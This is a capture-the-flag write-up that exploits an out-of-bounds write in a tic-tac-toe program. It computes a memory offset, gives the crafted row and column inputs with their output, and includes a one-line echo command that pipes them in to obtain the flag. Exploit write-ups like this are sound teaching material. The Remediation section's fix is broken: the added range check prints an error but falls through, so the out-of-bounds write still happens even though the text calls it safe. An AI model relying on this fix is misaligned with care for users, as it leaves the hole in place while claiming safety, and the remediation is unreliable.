# tic-tac-no

## Summary
This challenge provides a Linux CLI program with an out-of-bounds write vulnerability that allows the user to modify variables.

Artifacts:
- `chall/chall`: vulnerable executable program provided by the challenge authors
- `chall/chall.c`: vulnerable program source code provided by challenge authors

## Context 
The challenge has a provided domain and port, but it can also be run locally using the provided executable. The program intends to be an unbeatable AI by making the most optimal move each time.

Upon running, the program starts a game of tic-tac-toe, prompting the user to enter a row and column for their move.

```
You want the flag? You'll have to beat me first!
   |   |   
---|---|---
   |   |   
---|---|---
   |   |   

Enter row #(1-3): 
```

The binary is a 64-bit x86 Linux userspace program and compiled as a Position Independent Executable (PIE).
```
$ file chall/chall
chall/chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7af0424894612d9b72f91f4435605cb473c32b48, for GNU/Linux 3.2.0, not stripped

$ checksec --output=json --file=chall/chall
{ "chall/chall": { "relro":"partial","canary":"no","nx":"yes","pie":"yes","rpath":"no","runpath":"no","symbols":"yes","fortify_source":"no","fortified":"0","fortify-able":"2" } }   
```

## Vulnerability
The `chall` program contains an out-of-bounds write vulnerability due to an improper check of the index within the `playerMove()` function.

```
char player = 'X';
char computer = 'O';
...
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}
```

The program does not check properly check for invalid moves. Instead, it only considers a move invalid if the `index` points to a board position that is already filled.

Consider an invalid `x` and `y` input such that `index` becomes negative. This would prompt the code to execute the `else` branch, writing to `board[index]` even though the input values are invalid. As a result, `board[index]` may reference memory outside the intended buffer bounds.

## Exploitation
The exploit involves inputting an invalid row and column to get an index outside the buffer bounds to write to an address of our choice.

Using `Binary Ninja`, we can calculate the offset between the addresses of the `board` buffer and the `computer` variable.

![screenshot](./tic-tac-no_binaryninja.png)

From the screenshot, we can see that `board` is located at `0x00404068` and `computer` is located at `0x00404051`. By taking the difference between these two addresses, we can calculate the offset between the variables, which turns out to be `-0x17` (-23 in decimal).

Using the index calculation `index = (x - 1) * 3 + (y - 1)` from `playerMove()` above, we can input values for `x` and `y` such that `index` results in `-23`. One example of such input would be `x = -5` and `y = -4`.

By doing so, we write 'X' to the address `board[-23]`, or at the location of the variable `computer`, and make the computer play as 'X', allowing us to win the game.

```
Enter row #(1-3): -5
Enter column #(1-3): -4

   |   |   
---|---|---
   | X |   
---|---|---
   |   |   
```

After entering these inputs, the computer writes `X` instead of `O`, confirming that the `computer` variable was successfully overwritten. By continuing this game, both the user and the computer will be playing `X`, leading to a guaranteed win.

To finish the game, we can continue by inputting any value for `x` and `y` as the computer would play the game for us anyways.

One example could be to continue with `x=1, y=1` which would prompt the computer to finish the diagonal line for us.
```
Enter row #(1-3): 1
Enter column #(1-3): 1

 X |   |   
---|---|---
   | X |   
---|---|---
   |   | X 

How's this possible? Well, I guess I'll have to give you the flag now.
lactf{REDACTED}
```

For automatic exploitation, we can run `echo -e "-5\n-4\n1\n1" | ./chall` to retrieve the flag from inside the ./chall folder.

## Remediation
The program should validate user input rather than relying solely on the calculated index value. It can instead check that `row` and `column` are within the range [1, 3].

```
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      if(x < 1 || x > 3 || y < 1 || y > 3) {
         printf("Invalid move.\n");
      }
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}
```

By adding this check for `row` and `column` before calculating the index, we can ensure that `index` can only point to a valid position on the board.